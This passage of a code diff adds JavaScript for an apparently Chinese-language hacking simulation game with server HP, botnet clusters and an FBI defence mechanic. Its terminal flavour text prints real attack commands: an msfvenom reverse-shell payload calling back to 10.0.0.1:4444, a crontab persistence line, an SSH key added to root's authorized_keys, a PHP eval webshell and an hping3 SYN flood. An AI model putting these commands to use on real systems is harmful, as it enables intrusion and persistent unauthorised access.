+                termPrint('[*] Server HP: ' + server.hp + '/' + server.maxHp + ' (' + Math.round(server.hp/server.maxHp*100) + '%)', 'term-warn');
+            }
+        } else {
+            termPrint('[-] All privesc attempts failed', 'term-err');
+            termPrint('[-] Kernel appears patched, no SUID misconfigurations exploitable', 'term-err');
+        }
+        saveData(data);
+        renderClusterView(data);
+        renderStats(data);
+        CMD_DATA = null;
+    }, 1000);
+}
+
+// ===== 持久化后门（真实技术） =====
+function cmdPersistReal(server, method) {
+    var data = CMD_DATA || loadData();
+    // 从data中重新查找server确保引用一致
+    var srv = null, cluster = null;
+    for (var i = 0; i < data.clusters.length; i++) {
+        var f = data.clusters[i].servers.find(function(sv){return sv.id === server.id;});
+        if (f) { srv = f; cluster = data.clusters[i]; break; }
+    }
+    if (!srv) { termPrint('[-] 未找到目标服务器', 'term-err'); return; }
+    server = srv;
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+    if (server.hp > server.maxHp * 0.3) { termPrint('[-] HP需降低至30%以下才能植入后门', 'term-err'); return; }
+
+    termPrint('[*] Deploying persistence mechanism: ' + method, 'term-info');
+    termPrint('[*] Target: ' + server.ip + ' (' + server.name + ')', 'term-info');
+    termPrint('', 'term-out');
+    
+    if (method === 'crontab') {
+        termPrint('[*] Generating reverse shell payload...', 'term-dim');
+        termPrint('[*] msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/.systemd', 'term-dim');
+        termPrint('[*] Uploading payload...', 'term-dim');
+        termPrint('[*] echo "*/5 * * * * /tmp/.systemd" | crontab -', 'term-dim');
+        termPrint('[*] Writing to /etc/cron.d/system-update...', 'term-dim');
+    } else if (method === 'sshkey') {
+        termPrint('[*] Generating SSH key pair...', 'term-dim');
+        termPrint('[*] ssh-keygen -t rsa -b 4096 -f /tmp/.ssh_backdoor -N ""', 'term-dim');
+        termPrint('[*] cat /tmp/.ssh_backdoor.pub >> /root/.ssh/authorized_keys', 'term-dim');
+        termPrint('[*] chmod 600 /root/.ssh/authorized_keys', 'term-dim');
+        termPrint('[*] Backdoor SSH key: /tmp/.ssh_backdoor', 'term-dim');
+    } else if (method === 'webshell') {
+        termPrint('[*] Generating PHP webshell...', 'term-dim');
+        termPrint('[*] <?php @eval($_POST["cmd"]); ?>', 'term-dim');
+        termPrint('[*] Uploading to /var/www/html/.config.php', 'term-dim');
+        termPrint('[*] chmod 644 /var/www/html/.config.php', 'term-dim');
+        termPrint('[*] Webshell accessible at http://' + server.ip + '/.config.php', 'term-dim');
+    }
+
+    setTimeout(function() {
+        if (Math.random() < 0.7) {
+            var frChk = checkForceRepair(server, data);
+            if (frChk.blocked) {
+                termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+                termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+                addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+                saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                return;
+            }
+            if (frChk.reduced) {
+                var persistDmg = Math.floor(server.maxHp * frChk.damageMul);
+                server.hp = Math.max(0, server.hp - persistDmg);
+                termPrint('[!] FBI强制修复防护：伤害减免90%！后门植入失败，仅造成' + persistDmg + '伤害', 'term-warn');
+                if (server.hp > 0) {
+                    saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                    return;
+                }
+            }
+            server.hp = 0;
+            markServerBroken(data, server, getServerCluster(data, server));
+            termPrint('', 'term-out');
+            termPrint('[+] Persistence established successfully!', 'term-ok');
+            
+            if (method === 'crontab') {
+                termPrint('[+] Cron job installed: /etc/cron.d/system-update', 'term-ok');
+                termPrint('[+] Payload: /tmp/.systemd (reverse shell every 5 min)', 'term-ok');
+                termPrint('[+] Connection: 10.0.0.1:4444 <- ' + server.ip, 'term-ok');
+            } else if (method === 'sshkey') {
+                termPrint('[+] SSH backdoor key installed in /root/.ssh/authorized_keys', 'term-ok');
+                termPrint('[+] Access: ssh -i /tmp/.ssh_backdoor root@' + server.ip, 'term-ok');
+            } else if (method === 'webshell') {
+                termPrint('[+] Webshell deployed: http://' + server.ip + '/.config.php', 'term-ok');
+                termPrint('[+] Access: POST cmd=<command> to execute', 'term-ok');
+            }
+            
+            termPrint('', 'term-out');
+            termPrint('[★] ' + server.name + ' (' + server.ip + ') PERSISTENT ACCESS ESTABLISHED!', 'term-ok');
+            termPrint('[★] Server fully compromised and backdoored.', 'term-ok');
+            addLog(data, 'broken', server.name + ' 持久化后门 (' + method + ') 成功！');
+            checkClusterBroken(data, cluster);
+        } else {
+            termPrint('[-] Persistence failed!', 'term-err');
+            if (method === 'crontab') termPrint('[-] Crontab access denied or file system immutable', 'term-err');
+            if (method === 'sshkey') termPrint('[-] authorized_keys not writable or sshd_config restricted', 'term-err');
+            if (method === 'webshell') termPrint('[-] Web directory not writable or WAF detected upload', 'term-err');
+            termPrint('[-] AV/EDR may have detected the payload', 'term-err');
+        }
+        saveData(data);
+        renderClusterView(data);
+        renderStats(data);
+        CMD_DATA = null;
+    }, 800);
+}
+
+// ===== DDoS 真实工具输出 =====
+function cmdDdosReal(server) {
+    var data = CMD_DATA || loadData();
+    // 从data中重新查找server确保引用一致
+    var srv = null;
+    for (var i = 0; i < data.clusters.length; i++) {
+        var f = data.clusters[i].servers.find(function(sv){return sv.id === server.id;});
+        if (f) { srv = f; break; }
+    }
+    if (!srv) { termPrint('[-] 未找到目标服务器', 'term-err'); return; }
+    server = srv;
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+    var ownedCount = countOwnedClusters(data);
+    if (ownedCount === 0) { termPrint('[-] 需要至少1个僵尸网络群才能发动DDoS', 'term-err'); return; }
+
+    termPrint('HPING3 v3.1 by antirez', 'term-info');
+    termPrint('[*] Target: ' + server.ip + ' (' + server.name + ')', 'term-info');
+    termPrint('[*] Mode: --flood (packets sent as fast as possible)', 'term-warn');
+    termPrint('[*] Protocol: TCP SYN', 'term-out');
+    termPrint('[*] Source: ' + ownedCount + ' botnet cluster(s)', 'term-out');
+    termPrint('[*] Estimated bandwidth: ' + (ownedCount * randInt(500,2000)) + ' Mbps', 'term-out');
+    termPrint('[*] Packets per second: ' + (ownedCount * randInt(10000,50000)).toLocaleString(), 'term-out');
+    termPrint('', 'term-out');
+    
+    // 模拟攻击过程
+    var packets = 0;
+    var interval = setInterval(function() {
+        var pps = ownedCount * randInt(10000, 50000);
+        packets += pps;
+        termPrint('[' + now() + '] Sent: ' + pps.toLocaleString() + ' pps | Total: ' + packets.toLocaleString() + ' packets', 'term-out');
+    }, 300);
+
+    setTimeout(function() {
+        clearInterval(interval);
+        var damage = ownedCount * randInt(20, 50);
+        var frChk = checkForceRepair(server, data);
+        if (frChk.blocked) {
+            damage = 0;
+            termPrint('[!] FBI FORCE REPAIR SHIELD: DDoS attack blocked! (70% defense)', 'term-err');
+            termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+            addLog(data, 'fbi', '🛡️ 强制修复护盾拦截DDoS: ' + server.name);
+        } else if (frChk.reduced) {
+            damage = Math.floor(damage * frChk.damageMul);
+            termPrint('[!] FBI强制修复防护：伤害减免90%！实际伤害 ' + damage, 'term-warn');
+        }
+        server.hp = Math.max(0, server.hp - damage);
+        termPrint('', 'term-out');
+        termPrint('[+] DDoS attack completed', 'term-ok');
+        termPrint('[+] Total packets sent: ' + packets.toLocaleString(), 'term-ok');
+        termPrint('[+] Target response time: >' + randInt(3,30) + 's (SEVERE LAG)', 'term-ok');
+        termPrint('[+] Damage dealt: ' + damage + ' HP', 'term-ok');
+        termPrint('[!] Note: DDoS alone cannot fully compromise a server', 'term-warn');
+        
+        if (server.hp <= 0) {
+            server.hp = 1;
+            termPrint('[!] Server HP at 1. Use exploit/privesc to finish', 'term-warn');
+        }
+        termPrint('[*] Server HP: ' + server.hp + '/' + server.maxHp, 'term-info');
+        data.player.hackTraceScore += 5;
+        saveData(data);
+        renderClusterView(data);
+        renderStats(data);
+        CMD_DATA = null;
+    }, 1500);
+}
+
+function cmdFullAuto(server) {
+    var data = CMD_DATA || loadData();
+    // 从data中重新查找同一台server（确保引用一致）
+    var cluster = null;
+    var srv = null;
+    for (var i = 0; i < data.clusters.length; i++) {
+        var found = data.clusters[i].servers.find(function(sv){return sv.id === server.id;});
+        if (found) { srv = found; cluster = data.clusters[i]; break; }
+    }
+    if (!srv) { termPrint('[-] 未找到目标服务器', 'term-err'); return; }
+    server = srv;
+
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+    
+    // 强制修复拦截检测
+    var frChkFA = checkForceRepair(server, data);
+    if (frChkFA.blocked) {
+        termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+        termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+        addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+        saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+        return;
+    }
+    var faDmgMul = frChkFA.reduced ? frChkFA.damageMul : 1;
+    if (frChkFA.reduced) {
+        termPrint('[!] FBI强制修复防护：全自动攻击伤害减免90%！', 'term-warn');
+    }
+    
+    termPrint('[*] ═══全自动攻击模式启动═══', 'term-info');
+    termPrint('[*] Phase 1: Reconnaissance (nmap)', 'term-warn');
+    
+    if (!server.reconDone) {
+        termPrint('[*] Running nmap -sV -A ' + server.ip + '...', 'term-dim');
+        server.reconDone = true;
+    } else {
+        termPrint('[+] Target already scanned', 'term-ok');
+    }
+    
+    setTimeout(function() {
+        termPrint('[*] Phase 2: Exploitation (msfconsole)', 'term-warn');
+        var rate = calcSuccessRate(server, data, server.vulnerabilities[0] || 'rce') * 0.8;
+        
+        if (Math.random() * 100 < rate) {
+            server.hp = Math.max(0, server.hp - Math.floor(server.maxHp * 0.5 * faDmgMul));
+            var vulnInfo = VULN_CVE_MAP[server.vulnerabilities[0] || 'rce'] || {cve:'CVE-2024-XXXX', name:'exploit'};
+            termPrint('[+] Exploit succeeded: ' + vulnInfo.cve, 'term-ok');
+            termPrint('[+] Shell obtained (www-data)', 'term-ok');
+            termPrint('[*] HP: ' + server.hp + '/' + server.maxHp, 'term-warn');
+            
+            setTimeout(function() {
+                termPrint('[*] Phase 3: Privilege Escalation (privesc)', 'term-warn');
+                if (Math.random() < 0.6) {
+                    server.hp = Math.max(0, server.hp - Math.floor(server.maxHp * 0.3 * faDmgMul));
+                    termPrint('[+] CVE-2021-4034 (PwnKit) - root obtained!', 'term-ok');
+                    termPrint('[*] HP: ' + server.hp + '/' + server.maxHp, 'term-warn');
+                    
+                    setTimeout(function() {
+                        termPrint('[*] Phase 4: Persistence (crontab)', 'term-warn');
+                        if (server.hp <= 0.3 * server.maxHp && Math.random() < 0.5) {
+                            if (faDmgMul < 1) {
+                                termPrint('[-] FBI修复防护阻止后门植入！伤害减免90%', 'term-err');
+                                termPrint('[*] Manual privesc/persist needed', 'term-warn');
+                            } else {
+                                server.hp = 0;
+                                markServerBroken(data, server, getServerCluster(data, server));
+                                termPrint('[+] Backdoor planted: /etc/cron.d/system-update', 'term-ok');
+                                termPrint('[★] FULL AUTO ATTACK COMPLETE!', 'term-ok');
+                                termPrint('[★] ' + server.name + ' (' + server.ip + ') COMPROMISED!', 'term-ok');
+                                addLog(data, 'broken', server.name + ' 全自动攻击被攻破！');
+                                checkClusterBroken(data, cluster);
+                            }
+                        } else {
+                            termPrint('[-] Persistence failed, HP too high or AV detected', 'term-err');
+                            termPrint('[*] Manual privesc/persist needed', 'term-warn');
+                        }
+                        saveData(data);
+                        renderClusterView(data);
+                        renderStats(data);
+                        CMD_DATA = null;
+                    }, 800);
+                } else {
+                    termPrint('[-] Privesc failed', 'term-err');
+                    termPrint('[*] Manual privesc needed', 'term-warn');
+                    saveData(data);
+                    renderClusterView(data);
+                    renderStats(data);
+                    CMD_DATA = null;
+                }
+            }, 800);
+        } else {
+            termPrint('[-] Exploit failed, auto attack aborted', 'term-err');
+            saveData(data);
+            renderClusterView(data);
+            renderStats(data);
+            CMD_DATA = null;
+        }
+    }, 800);
+}
+
+// ===== 检测服务器群是否被完全攻破 =====
+function checkClusterBroken(data, cluster) {
+    if (!cluster) return;
+    var allBroken = cluster.servers.every(function(s){return s.isBroken;});
+    if (allBroken && !cluster.isOwned) {
+        cluster.isOwned = true;
+        cluster.ownedSince = data.currentRound;
+        data.player.ownedClusters.push(cluster.id);
+        addLog(data, 'system', '🏭 ' + cluster.name + ' 全部攻破！已占领，成为僵尸网络节点！');
+        termPrint('[★] ' + cluster.name + ' 全部攻破！已占领为僵尸网络！', 'term-ok');
+    }
+    saveData(data);
+}
+
+// ===== 自动指挥状态 =====
+var AUTO_ATTACK = {
+    active: false,
+    srcId: null,
+    tgtId: null,
+    atkType: 'exploit',
+    intervalId: null,
+    roundCount: 0
+};
+
+function startAutoAttack() {
+    var srcId = parseInt(document.getElementById('bnAutoSource').value, 10);
+    var tgtId = parseInt(document.getElementById('bnAutoTarget').value, 10);
+    var atkType = document.getElementById('bnAutoType').value;
+    if (!srcId || !tgtId) { alert('请先选择攻击源群和目标群'); return; }
+    if (srcId === tgtId) { alert('攻击源和目标不能相同'); return; }
+
+    AUTO_ATTACK.active = true;
+    AUTO_ATTACK.srcId = srcId;
+    AUTO_ATTACK.tgtId = tgtId;
+    AUTO_ATTACK.atkType = atkType;
+    AUTO_ATTACK.roundCount = 0;
+
+    var data = loadData();
+    addLog(data, 'botnet', '🤖 自动指挥启动: ' + (getCluster(data, srcId)||{name:'?'}).name + ' → ' + (getCluster(data, tgtId)||{name:'?'}).name + ' [' + atkType + ']');
+    saveData(data);
+    renderBotnet(data);
+
+    // 立即执行第一轮
+    autoBotnetRound();
+
+    // 每1.5秒一轮
+    AUTO_ATTACK.intervalId = setInterval(function() {
+        if (!AUTO_ATTACK.active) { clearInterval(AUTO_ATTACK.intervalId); return; }
+        autoBotnetRound();
+    }, 1500);
+}
+
+function stopAutoAttack() {
+    if (AUTO_ATTACK.intervalId) clearInterval(AUTO_ATTACK.intervalId);
+    AUTO_ATTACK.active = false;
+    var data = loadData();
+    addLog(data, 'botnet', '⏹ 自动指挥已停止（共执行 ' + AUTO_ATTACK.roundCount + ' 轮）');
+    saveData(data);
+    renderBotnet(data);
+}
+
+function autoBotnetRound() {
+    var data = loadData();
+    var src = getCluster(data, AUTO_ATTACK.srcId);
+    var tgt = getCluster(data, AUTO_ATTACK.tgtId);
+
+    // 检查源群是否还是我方占领
+    if (!src || !src.isOwned) {
+        addLog(data, 'botnet', '⚠ 自动指挥中止: 攻击源群已不可用');
+        saveData(data);
+        clearInterval(AUTO_ATTACK.intervalId);
+        AUTO_ATTACK.active = false;
+        renderBotnet(data);
+        return;
+    }
+
+    // 检查目标群是否已全部攻破
+    var remaining = tgt ? tgt.servers.filter(function(s){ return !s.isBroken; }) : [];
+    if (!tgt || remaining.length === 0) {
+        addLog(data, 'botnet', '🎉 自动指挥完成！' + (tgt ? tgt.name : '目标群') + ' 已全部占领！共执行 ' + AUTO_ATTACK.roundCount + ' 轮');
+        saveData(data);
+        clearInterval(AUTO_ATTACK.intervalId);
+        AUTO_ATTACK.active = false;
+        renderBotnet(data);
+        renderStats(data);
+        renderTopology(data);
+        return;
+    }
+
+    // 检查连接
+    if (src.connections.indexOf(AUTO_ATTACK.tgtId) < 0) {
+        addLog(data, 'botnet', '⚠ 自动指挥中止: ' + src.name + ' 与 ' + tgt.name + ' 不直接相连');
+        saveData(data);
+        clearInterval(AUTO_ATTACK.intervalId);
+        AUTO_ATTACK.active = false;
+        renderBotnet(data);
+        return;
+    }
+
+    AUTO_ATTACK.roundCount++;
+
+    var totalLevel = src.servers.reduce(function(sum, s){ return sum + s.level; }, 0);
+    var attackPower = totalLevel * 2;
+
+    // 每轮攻击HP最低的目标
+    remaining.sort(function(a, b){ return a.hp - b.hp; });
+    var target = remaining[0];
+
+    var damage = Math.floor(attackPower * (0.3 + Math.random() * 0.4));
+    target.hp = Math.max(0, target.hp - damage);
+
+    var msg = '[R' + AUTO_ATTACK.roundCount + '] ' + src.name + '→' + tgt.name + ' [' + AUTO_ATTACK.atkType + '] 攻击 ' + target.name + ' 造成 ' + damage + ' 伤害';
+    if (target.hp <= 0) {
+        markServerBroken(data, target, getServerCluster(data, target));
+        msg += ' 【攻破！剩余 ' + (remaining.length - 1) + ' 台】';
+        checkClusterBroken(data, tgt);
+    }
+    addLog(data, 'botnet', msg);
+    data.player.hackTraceScore += 1;
+    saveData(data);
+
+    // 刷新UI
+    var tab = document.getElementById('botnetView');
+    if (tab && tab.closest('.tab-content') && !tab.closest('.tab-content').classList.contains('hidden')) {
+        renderBotnet(data);
+    }
+    renderStats(data);
+}
+
+// ===== 渲染：僵尸网络 =====
+function renderBotnet(data) {
+    var el = document.getElementById('botnetView');
+    var ownedClusters = data.clusters.filter(function(c){return c.isOwned;});
+
+    var html = '<div class="botnet-panel">';
+    html += '<h3>🧟 僵尸网络控制台</h3>';
+    if (ownedClusters.length === 0) {
+        html += '<p style="color:#006600;font-size:11px;">尚未占领任何服务器群。完全攻破一个群（20/20台服务器）即可占领为僵尸网络。</p>';
+    } else {
+        html += '<div class="botnet-list">';
+        ownedClusters.forEach(function(c) {
+            var totalLevel = c.servers.reduce(function(sum, s){return sum + s.level;}, 0);
+            html += '<div class="botnet-item">';
+            html += '<span class="bn-name">🧟 ' + c.name + '</span>';
+            html += '<span class="bn-stats">攻击力 ' + (totalLevel * 2) + ' · 防御力 ' + Math.ceil(totalLevel * 1.5) + ' · 占领回合 #' + (c.ownedSince || 0) + '</span>';
+            html += '</div>';
+        });
+        html += '</div>';
+
+        // 手动指挥
+        html += '<div class="attack-control">';
+        html += '<span style="font-size:10px;color:#008800;">手动指挥:</span>';
+        html += '<select id="bnSource"><option value="">攻击源</option>';
+        ownedClusters.forEach(function(c) { html += '<option value="' + c.id + '">' + c.name + '</option>'; });
+        html += '</select>';
+        html += '<span style="font-size:10px;color:#005500;">→</span>';
+        html += '<select id="bnTarget"><option value="">目标群</option>';
+        data.clusters.filter(function(c){return !c.isOwned;}).forEach(function(c) {
+            html += '<option value="' + c.id + '">' + c.name + ' (Lv.' + c.levelRange[0] + '-' + c.levelRange[1] + ')</option>';
+        });
+        html += '</select>';
+        html += '<select id="bnAttackType">';
+        html += '<option value="exploit">漏洞利用</option>';
+        html += '<option value="ddos">DDoS</option>';
+        html += '<option value="phishing">钓鱼攻击</option>';
+        html += '</select>';
+        html += '<button onclick="manualBotnetAttack()">🔥 发动攻击</button>';
+        html += '</div>';
+
+        // 自动指挥
+        var autoStatusColor = AUTO_ATTACK.active ? '#00ff41' : '#005500';
+        var autoStatusText = AUTO_ATTACK.active ? '🤖 运行中 (第 ' + AUTO_ATTACK.roundCount + ' 轮)' : '🤖 自动指挥:';
+        html += '<div class="attack-control" style="margin-top:8px;border-color:rgba(0,255,65,0.2);background:rgba(0,40,0,0.5);">';
+        html += '<span style="font-size:10px;color:' + autoStatusColor + ';">' + autoStatusText + '</span>';
+        if (!AUTO_ATTACK.active) {
+            html += '<select id="bnAutoSource"><option value="">攻击源</option>';
+            ownedClusters.forEach(function(c) { html += '<option value="' + c.id + '">' + c.name + '</option>'; });
+            html += '</select>';
+            html += '<span style="font-size:10px;color:#005500;">→</span>';
+            html += '<select id="bnAutoTarget"><option value="">目标群</option>';
+            data.clusters.filter(function(c){return !c.isOwned;}).forEach(function(c) {
+                html += '<option value="' + c.id + '">' + c.name + ' (Lv.' + c.levelRange[0] + '-' + c.levelRange[1] + ')</option>';
+            });
+            html += '</select>';
+            html += '<select id="bnAutoType">';
+            html += '<option value="exploit">漏洞利用</option>';
+            html += '<option value="ddos">DDoS</option>';
+            html += '<option value="phishing">钓鱼攻击</option>';
+            html += '</select>';
+            html += '<button onclick="startAutoAttack()" style="background:rgba(0,180,80,0.2);border-color:rgba(0,255,65,0.5);color:#00ff41;">▶ 发起攻击</button>';
+        } else {
+            // 显示当前自动攻击状态
+            var curSrc = getCluster(data, AUTO_ATTACK.srcId);
+            var curTgt = getCluster(data, AUTO_ATTACK.tgtId);
+            var tgtRemaining = curTgt ? curTgt.servers.filter(function(s){return !s.isBroken;}).length : 0;
+            html += '<span style="font-size:10px;color:#00cc44;">' + (curSrc ? curSrc.name : '?') + '</span>';
+            html += '<span style="font-size:10px;color:#005500;margin:0 4px;">→</span>';
+            html += '<span style="font-size:10px;color:#ffaa00;">' + (curTgt ? curTgt.name : '?') + ' (剩余 ' + tgtRemaining + ' 台)</span>';
+            html += '<span style="font-size:10px;color:#005500;margin:0 4px;">[' + AUTO_ATTACK.atkType + ']</span>';
+            html += '<button onclick="stopAutoAttack()" style="background:rgba(180,0,0,0.2);border-color:rgba(255,60,60,0.5);color:#ff4444;">⏹ 停止攻击</button>';
+        }
+        html += '</div>';
+    }
+    html += '</div>';
+
+    // 自动攻击日志
+    html += '<div class="botnet-panel">';
+    html += '<h3>📋 自动攻击日志</h3>';
+    var botLogs = data.logs.filter(function(l){return l.type === 'botnet';}).slice(0, 15);
+    if (botLogs.length === 0) {
+        html += '<p style="color:#003300;font-size:10px;">暂无自动攻击记录</p>';
+    } else {
+        html += '<div class="log-container" style="max-height:300px;">';
+        botLogs.forEach(function(l) {
+            html += '<div class="log-entry"><span class="log-ts">' + l.ts + '</span><span class="log-type botnet">僵尸</span><span class="log-msg">' + l.msg + '</span></div>';
+        });
+        html += '</div>';
+    }
+    html += '</div>';
+
+    el.innerHTML = html;
+}
+
+function manualBotnetAttack() {
+    var srcId = parseInt(document.getElementById('bnSource').value, 10);
+    var tgtId = parseInt(document.getElementById('bnTarget').value, 10);
+    var atkType = document.getElementById('bnAttackType').value;
+    if (!srcId || !tgtId) return;
+
+    var data = loadData();
+    var src = getCluster(data, srcId);
+    var tgt = getCluster(data, tgtId);
+    if (!src || !tgt) return;
+
+    // 检查连接
+    if (src.connections.indexOf(tgtId) < 0) {
+        addLog(data, 'botnet', '攻击失败: ' + src.name + ' 与 ' + tgt.name + ' 不直接相连');
+        saveData(data);
+        renderBotnet(data);
+        return;
+    }
+
+    var totalLevel = src.servers.reduce(function(sum, s){return sum + s.level;}, 0);
+    var attackPower = totalLevel * 2;
+
+    // 选择目标群中HP最低的非攻破服务器
+    var targets = tgt.servers.filter(function(s){return !s.isBroken;});
+    if (targets.length === 0) {
+        addLog(data, 'botnet', '目标群已全部攻破');
+        saveData(data);
+        renderBotnet(data);
+        return;
+    }
+    targets.sort(function(a, b){return a.hp - b.hp;});
+    var target = targets[0];
+
+    var damage = Math.floor(attackPower * (0.3 + Math.random() * 0.4));
+    target.hp = Math.max(0, target.hp - damage);
+
+    var msg = src.name + ' → ' + tgt.name + ' [' + atkType + '] 造成 ' + damage + ' 伤害';
+    if (target.hp <= 0) {
+        markServerBroken(data, target, getServerCluster(data, target));
+        msg += ' · ' + target.name + ' 被攻破！';
+        checkClusterBroken(data, tgt);
+    }
+    addLog(data, 'botnet', msg);
+    data.player.hackTraceScore += 2;
+    saveData(data);
+    renderBotnet(data);
+    renderStats(data);
+}
+
+// ===== 渲染：FBI状态 =====
+function renderFBI(data) {
+    var el = document.getElementById('fbiView');
+    var html = '<div class="fbi-panel">';
+
+    if (!data.fbi.active) {
+        html += '<div class="fbi-status fbi-inactive">FBI 尚未介入</div>';
+        html += '<div class="fbi-section">';
+        html += '<div class="fbi-section-title">扫描进度</div>';
+        html += '<p style="font-size:11px;color:#008800;">FBI每2回合扫描一次，发现概率 = 已攻破服务器数 × 2%</p>';
+        html += '<p style="font-size:11px;color:#006600;">当前已攻破: ' + countBrokenServers(data) + ' 台 · 发现概率: ' + (countBrokenServers(data) * 2) + '%</p>';
+        html += '<p style="font-size:11px;color:#005500;">追踪分数: ' + data.player.hackTraceScore + '</p>';
+        html += '<p style="font-size:11px;color:#ff4466;">⚠ 占领全部服务器群时，FBI将启动「强制性修复」协议</p>';
+        html += '</div>';
+    } else {
+        html += '<div class="fbi-status fbi-active">🛡️ FBI 已介入 - 网络犯罪调查部</div>';
+        html += '<div class="fbi-section">';
+        html += '<div class="fbi-section-title">保护中的服务器群</div>';
+        html += '<div class="fbi-protected-list">';
+        if (data.fbi.protectedClusters.length === 0) {
+            html += '<span style="font-size:10px;color:#006600;">暂无</span>';
+        } else {
+            data.fbi.protectedClusters.forEach(function(cid) {
+                var c = getCluster(data, cid);
+                if (c) html += '<span class="fbi-protected-item">' + c.name + '</span>';
+            });
+        }
+        html += '</div>';
+        html += '</div>';
+
+        html += '<div class="fbi-section">';
+        html += '<div class="fbi-section-title">蜜罐系统</div>';
+        if (data.tunnel && data.tunnel.isBroken) {
+            html += '<div class="fbi-status" style="background:rgba(255,68,68,0.15);color:#ff4444;padding:6px 10px;border-radius:4px;font-size:11px;">💀 蜜罐系统已崩溃（代理隧道被攻破）</div>';
+            html += '<p style="font-size:10px;color:#ff4444;">蜜罐永久失效，无法再被激活。FBI保护群成功率惩罚从-20%降至-6%。</p>';
+        } else if (data.fbi.honeypotActive) {
+            html += '<div class="fbi-status fbi-honeypot">🍯 蜜罐已开启 - 被保护群防御+60%，攻击70%失败</div>';
+            if (data.fbi.honeypotDebuffEnds > data.currentRound) {
+                html += '<p style="font-size:10px;color:#ff4466;">攻击力减半剩余: ' + (data.fbi.honeypotDebuffEnds - data.currentRound) + ' 回合</p>';
+            }
+            if (data.fbi.scanBoostEnds > data.currentRound) {
+                html += '<p style="font-size:10px;color:#ff4466;">FBI扫描频率翻倍剩余: ' + (data.fbi.scanBoostEnds - data.currentRound) + ' 回合</p>';
+            }
+        } else {
+            html += '<p style="font-size:10px;color:#006600;">蜜罐未开启（玩家攻击力 > 100 时自动开启）</p>';
+        }
+        html += '</div>';
+
+        html += '<div class="fbi-section">';
+        html += '<div class="fbi-section-title">FBI服务器群</div>';
+        html += '<p style="font-size:10px;color:#008800;">10台服务器 · Lv.10 极高防御 · 可攻击</p>';
+        html += '<p style="font-size:10px;color:#005500;">攻破FBI后暂时消失（500回合冷却）</p>';
+        html += '</div>';
+    }
+
+    // 强制性修复状态面板
+    if (data.fbi.forceRepairActive) {
+        html += '<div class="fbi-section">';
+        html += '<div class="fbi-section-title" style="color:#ff4444;">🔧 强制性修复协议（已激活）</div>';
+        html += '<div class="fbi-status" style="background:rgba(255,68,68,0.15);color:#ff4444;padding:6px 10px;border-radius:4px;font-size:11px;">🚨 全服务器群被占领！FBI每回合修复3台服务器</div>';
+        html += '<p style="font-size:10px;color:#ff6644;">修复效果：HP全恢复 + 90%防御buff持续3回合</p>';
+        html += '<p style="font-size:10px;color:#ff8866;">攻击拦截：70%概率直接失败，30%成功但伤害减免90%</p>';
+        html += '<p style="font-size:10px;color:#ff4444;">⚠ 群中超过3台服务器被修复 → 失去控制权，变为FBI保护群</p>';
+        var repairedCount = countForceRepairedServers(data);
+        html += '<p style="font-size:10px;color:#ffaa00;">当前受保护服务器：' + repairedCount + ' 台</p>';
+        // 列出被保护的服务器
+        data.clusters.forEach(function(c) {
+            c.servers.forEach(function(s) {
+                if (s.forceRepairBuff > 0) {
+                    html += '<p style="font-size:9px;color:#ff8866;padding-left:12px;">· ' + c.name + '/' + s.name + ' (剩余' + s.forceRepairBuff + '回合)</p>';
+                }
+            });
+        });
+        html += '</div>';
+    }
+    html += '</div>';
+
+    // FBI扫描历史
+    html += '<div class="fbi-panel">';
+    html += '<h3>📊 FBI扫描历史</h3>';
+    var fbiLogs = data.logs.filter(function(l){return l.type === 'fbi';}).slice(0, 15);
+    if (fbiLogs.length === 0) {
+        html += '<p style="color:#003300;font-size:10px;">暂无扫描记录</p>';
+    } else {
+        html += '<div class="log-container" style="max-height:300px;">';
+        fbiLogs.forEach(function(l) {
+            html += '<div class="log-entry"><span class="log-ts">' + l.ts + '</span><span class="log-type fbi">FBI</span><span class="log-msg">' + l.msg + '</span></div>';
+        });
+        html += '</div>';
+    }
+    html += '</div>';
+
+    el.innerHTML = html;
+}
+
+// ===== 渲染：代理隧道 =====
+var TUNNEL_TERM = null;
+function renderTunnel(data) {
+    var el = document.getElementById('tunnelView');
+    var t = data.tunnel;
+    if (!t) return;
+
+    var hpPct = t.maxHp > 0 ? (t.hp / t.maxHp * 100) : 0;
+    var hpCls = t.isBroken ? 'hp-zero' : (hpPct > 60 ? 'hp-high' : (hpPct > 30 ? 'hp-mid' : 'hp-low'));
+
+    var html = '<div class="cluster-header">';
+    html += '<h2>🔗 ' + t.name + '</h2>';
+    html += '<span class="cluster-badge" style="color:#ff6600;border-color:#ff6600;">Lv.' + t.level + ' · 跨网隧道</span>';
+    if (t.isBroken) html += '<span class="cluster-badge badge-owned">✅ 已攻破</span>';
+    html += '</div>';
+
+    html += '<div style="font-size:11px;color:#993C1D;margin-bottom:10px;">' + t.desc + '</div>';
+
+    // 隧道属性面板
+    html += '<div style="background:rgba(255,102,0,0.08);border:1px solid #ff6600;border-radius:6px;padding:12px;margin-bottom:12px;">';
+    html += '<div style="display:flex;gap:20px;flex-wrap:wrap;font-size:12px;">';
+    html += '<span>⚔️ 攻击力: <b style="color:#ff4444;">' + t.attackPower + '</b></span>';
+    html += '<span>🛡️ 防御力: <b style="color:#00aaff;">' + t.defense + '</b></span>';
+    html += '<span>📊 等级: <b style="color:#ffaa00;">' + t.level + '</b></span>';
+    html += '<span>💔 状态: <b style="color:' + (t.isBroken ? '#00ff41' : '#ff6600') + ';">' + (t.isBroken ? '已攻破' : '完好') + '</span>';
+    html += '</div>';
+    if (!t.isBroken) {
